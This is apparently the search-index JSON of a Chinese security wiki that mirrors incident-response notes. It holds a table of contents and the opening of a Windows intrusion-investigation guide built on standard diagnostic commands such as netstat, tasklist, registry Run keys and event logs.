{"config":{"lang":["ja"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5b89\u5168WiKi \u00b6 \u5173\u4e8e\u672cWIKI \u00b6 \u7531\u4e8e\u7f51\u7edc\u73b0\u5728\u5404\u79cd\u5b89\u5168\u6587\u7ae0\u548c\u77e5\u8bc6\u6bd4\u8f83\u7e41\u6742\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u9020\u8f6e\u5b50\u548c\u641c\u7d22\u7684\u56f0\u96be\uff0c\u56e0\u6b64\u672c\u4eba\u5c1d\u8bd5\u5c06\u5404\u5927\u6587\u5e93\u4ee5\u53ca\u516c\u4f17\u53f7\u590d\u73b0\u6587\u7ae0\u8fdb\u884c\u642c\u8fd0\u6c47\u603b\u548c\u4e2a\u4eba\u8865\u5145\uff0c\u5982\u679c\u6709\u4fb5\u6743\uff0c\u8bf7\u8054\u7cfb\u6211\uff0c\u8c22\u8c22\u3002 \u6587\u5e93\u8303\u56f4\uff08\u5f85\u5b8c\u5584\uff09 \u00b6 \u6e17\u900f\u6d4b\u8bd5 \u6f0f\u6d1e\u590d\u73b0 2021\u5e744\u670818\u65e5\u65b0\u589e\uff1aWX\u5229\u7528Chrome 0day\u4e0a\u7ebfCS \u4ee3\u7801\u5ba1\u8ba1 \u5b89\u5168\u5de5\u5177 \u5185\u7f51\u6e17\u900f \u53cb\u94fe \u00b6 PeiQi\u6587\u5e93\uff1a' http://wiki.peiqi.tech ' Bypass007\u5e94\u6025\u54cd\u5e94\uff1a ' https://github.com/Bypass007/Emergency-Response-Notes ' \u5b89\u5168WIKI\uff1a' https://fengchenzxc.github.io ' \u9879\u76ee\u5730\u5740\uff1a' https://github.com/fengchenzxc/fengchenzxc.github.io ' \u6700\u540e \u00b6 \u522b\u5fd8\u4e86\u7ed9\u4e2astar","title":"\u5173\u4e8e\u672c\u7ad9"},{"location":"#\u5b89\u5168wiki","text":"","title":"\u5b89\u5168WiKi"},{"location":"#\u5173\u4e8e\u672cwiki","text":"\u7531\u4e8e\u7f51\u7edc\u73b0\u5728\u5404\u79cd\u5b89\u5168\u6587\u7ae0\u548c\u77e5\u8bc6\u6bd4\u8f83\u7e41\u6742\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u9020\u8f6e\u5b50\u548c\u641c\u7d22\u7684\u56f0\u96be\uff0c\u56e0\u6b64\u672c\u4eba\u5c1d\u8bd5\u5c06\u5404\u5927\u6587\u5e93\u4ee5\u53ca\u516c\u4f17\u53f7\u590d\u73b0\u6587\u7ae0\u8fdb\u884c\u642c\u8fd0\u6c47\u603b\u548c\u4e2a\u4eba\u8865\u5145\uff0c\u5982\u679c\u6709\u4fb5\u6743\uff0c\u8bf7\u8054\u7cfb\u6211\uff0c\u8c22\u8c22\u3002","title":"\u5173\u4e8e\u672cWIKI"},{"location":"#\u6587\u5e93\u8303\u56f4\u5f85\u5b8c\u5584","text":"\u6e17\u900f\u6d4b\u8bd5 \u6f0f\u6d1e\u590d\u73b0 2021\u5e744\u670818\u65e5\u65b0\u589e\uff1aWX\u5229\u7528Chrome 0day\u4e0a\u7ebfCS \u4ee3\u7801\u5ba1\u8ba1 \u5b89\u5168\u5de5\u5177 \u5185\u7f51\u6e17\u900f","title":"\u6587\u5e93\u8303\u56f4\uff08\u5f85\u5b8c\u5584\uff09"},{"location":"#\u53cb\u94fe","text":"PeiQi\u6587\u5e93\uff1a' http://wiki.peiqi.tech ' Bypass007\u5e94\u6025\u54cd\u5e94\uff1a ' https://github.com/Bypass007/Emergency-Response-Notes ' \u5b89\u5168WIKI\uff1a' https://fengchenzxc.github.io ' \u9879\u76ee\u5730\u5740\uff1a' https://github.com/fengchenzxc/fengchenzxc.github.io '","title":"\u53cb\u94fe"},{"location":"#\u6700\u540e","text":"\u522b\u5fd8\u4e86\u7ed9\u4e2astar","title":"\u6700\u540e"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","text":"\u642c\u8fd0\u5730\u5740\uff1a \u00b6 GitHub \u5730\u5740\uff1a https://github.com/Bypass007/Emergency-Response-Notes GitBook \u5730\u5740\uff1a https://bypass007.github.io/Emergency-Response-Notes/ \u9879\u76ee\u4ecb\u7ecd \u00b6 \u9762\u5bf9\u5404\u79cd\u5404\u6837\u7684\u5b89\u5168\u4e8b\u4ef6\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u5904\u7406\uff1f \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e\u5b89\u5168\u4e8b\u4ef6\u5e94\u6025\u54cd\u5e94\u7684\u9879\u76ee\uff0c\u4ece\u7cfb\u7edf\u5165\u4fb5\u5230\u4e8b\u4ef6\u5904\u7406\uff0c\u6536\u96c6\u548c\u6574\u7406\u4e86\u4e00\u4e9b\u6848\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u6211\u5c06\u6301\u7eed\u66f4\u65b0\u8fd9\u4efd\u7b14\u8bb0\uff0c\u5e0c\u671b\u80fd\u5e2e\u5230\u6709\u9700\u8981\u7684\u4eba\u3002 \u5982\u679c\u4f60\u770b\u5230\u597d\u7684\u6848\u4f8b\uff0c\u6b22\u8fce\u901a\u8fc7issue\u63d0\u4ea4\u3002 \u9879\u76ee\u76ee\u5f55 \u00b6 [\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u76f8\u5173\u4ecb\u7ecd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#\u642c\u8fd0\u5730\u5740","text":"GitHub \u5730\u5740\uff1a https://github.com/Bypass007/Emergency-Response-Notes GitBook \u5730\u5740\uff1a https://bypass007.github.io/Emergency-Response-Notes/","title":"\u642c\u8fd0\u5730\u5740\uff1a"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#\u9879\u76ee\u4ecb\u7ecd","text":"\u9762\u5bf9\u5404\u79cd\u5404\u6837\u7684\u5b89\u5168\u4e8b\u4ef6\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u5904\u7406\uff1f \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e\u5b89\u5168\u4e8b\u4ef6\u5e94\u6025\u54cd\u5e94\u7684\u9879\u76ee\uff0c\u4ece\u7cfb\u7edf\u5165\u4fb5\u5230\u4e8b\u4ef6\u5904\u7406\uff0c\u6536\u96c6\u548c\u6574\u7406\u4e86\u4e00\u4e9b\u6848\u4f8b\u8fdb\u884c\u5206\u6790\u3002 \u6211\u5c06\u6301\u7eed\u66f4\u65b0\u8fd9\u4efd\u7b14\u8bb0\uff0c\u5e0c\u671b\u80fd\u5e2e\u5230\u6709\u9700\u8981\u7684\u4eba\u3002 \u5982\u679c\u4f60\u770b\u5230\u597d\u7684\u6848\u4f8b\uff0c\u6b22\u8fce\u901a\u8fc7issue\u63d0\u4ea4\u3002","title":"\u9879\u76ee\u4ecb\u7ecd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#\u9879\u76ee\u76ee\u5f55","text":"[\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u9879\u76ee\u76ee\u5f55"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/","text":"\u7b2c1\u7bc7\uff1awindows \u5165\u4fb5\u6392\u67e5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u5e38\u89c1\u7684\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u7c7b\uff1a Web \u5165\u4fb5\uff1a\u7f51\u9875\u6302\u9a6c\u3001\u4e3b\u9875\u7be1\u6539\u3001Webshell \u7cfb\u7edf\u5165\u4fb5\uff1a\u75c5\u6bd2\u6728\u9a6c\u3001\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u63a7\u540e\u95e8 \u7f51\u7edc\u653b\u51fb\uff1aDDOS \u653b\u51fb\u3001DNS \u52ab\u6301\u3001ARP \u6b3a\u9a97 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9b Windows \u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002 0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def \u00b6 1.1 \u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168 \u00b6 1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u6709\u5f31\u53e3\u4ee4\uff0c\u8fdc\u7a0b\u7ba1\u7406\u7aef\u53e3\u662f\u5426\u5bf9\u516c\u7f51\u5f00\u653e\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u636e\u5b9e\u9645\u60c5\u51b5\u54a8\u8be2\u76f8\u5173\u670d\u52a1\u5668\u7ba1\u7406\u5458\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 3\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 4\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\"eventvwr.msc\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 b\u3001\u5bfc\u51fa Windows \u65e5\u5fd7 -- \u5b89\u5168\uff0c\u5229\u7528\u5fae\u8f6f\u5b98\u65b9\u5de5\u5177 Log Parser \u8fdb\u884c\u5206\u6790\u3002 1.2 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3\u3001\u8fdb\u7a0b \u00b6 1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u4f7f\u7528 netstat -ano \u547d\u4ee4\u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684 ESTABLISHED b\u3001\u6839\u636e netstat \u547d\u4ee4\u5b9a\u4f4d\u51fa\u7684 PID \u7f16\u53f7\uff0c\u518d\u901a\u8fc7 tasklist \u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \"PID\" 2\u3001\u8fdb\u7a0b \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5f00\u59cb -- \u8fd0\u884c -- \u8f93\u5165 msinfo32 \u547d\u4ee4\uff0c\u4f9d\u6b21\u70b9\u51fb \"\u8f6f\u4ef6\u73af\u5883 -- \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\" \u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u4ee5\u53ca\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU \u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a \u200b a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684 PID\uff1a netstat -ano | findstr \"port\" \u200b b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684 PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668 -- \u67e5\u770b -- \u9009\u62e9\u5217 -- PID \u6216\u8005 tasklist | findstr \"PID\" \u200b c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u200b \u4efb\u52a1\u7ba1\u7406\u5668 -- \u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b -- \u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u200b \u8fd0\u884c\u8f93\u5165 wmic \uff0ccmd \u754c\u9762\u8f93\u5165 process \u200b d\u3001 tasklist /svc \u8fdb\u7a0b -- PID -- \u670d\u52a1 \u200b e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a \u200b %systemroot%/system32/drivers/etc/services\uff08\u4e00\u822c %systemroot% \u5c31\u662f C:\\Windows \u8def\u5f84\uff09 1.3 \u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1 \u00b6 1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig \uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce \u68c0\u67e5\u53f3\u4fa7\u662f\u5426\u6709\u542f\u52a8\u5f02\u5e38\u7684\u9879\u76ee\uff0c\u5982\u6709\u8bf7\u5220\u9664\uff0c\u5e76\u5efa\u8bae\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u75c5\u6bd2\u67e5\u6740\uff0c\u6e05\u9664\u6b8b\u7559\u75c5\u6bd2\u6216\u6728\u9a6c\u3002 d\u3001\u5229\u7528\u5b89\u5168\u8f6f\u4ef6\u67e5\u770b\u542f\u52a8\u9879\u3001\u5f00\u673a\u65f6\u95f4\u7ba1\u7406\u7b49\u3002 e\u3001\u7ec4\u7b56\u7565\uff0c\u8fd0\u884c gpedit.msc 2\u3001\u68c0\u67e5\u8ba1\u5212\u4efb\u52a1 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8bbe\u7f6e\u3011>\u3010\u63a7\u5236\u9762\u677f\u3011>\u3010\u4efb\u52a1\u8ba1\u5212\u3011\uff0c\u67e5\u770b\u8ba1\u5212\u4efb\u52a1\u5c5e\u6027\uff0c\u4fbf\u53ef\u4ee5\u53d1\u73b0\u6728\u9a6c\u6587\u4ef6\u7684\u8def\u5f84\u3002 b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff1b\u8f93\u5165 cmd \uff0c\u7136\u540e\u8f93\u5165 at \uff0c\u68c0\u67e5\u8ba1\u7b97\u673a\u4e0e\u7f51\u7edc\u4e0a\u7684\u5176\u5b83\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u4f1a\u8bdd\u6216\u8ba1\u5212\u4efb\u52a1\uff0c\u5982\u6709\uff0c\u5219\u786e\u8ba4\u662f\u5426\u4e3a\u6b63\u5e38\u8fde\u63a5\u3002 3\u3001\u670d\u52a1\u81ea\u542f\u52a8 \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 services.msc \uff0c\u6ce8\u610f\u670d\u52a1\u72b6\u6001\u548c\u542f\u52a8\u7c7b\u578b\uff0c\u68c0\u67e5\u662f\u5426\u6709\u5f02\u5e38\u670d\u52a1\u3002 1.4 \u68c0\u67e5\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f \u00b6 1\u3001\u67e5\u770b\u7cfb\u7edf\u7248\u672c\u4ee5\u53ca\u8865\u4e01\u4fe1\u606f \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 systeminfo \uff0c\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\u3002 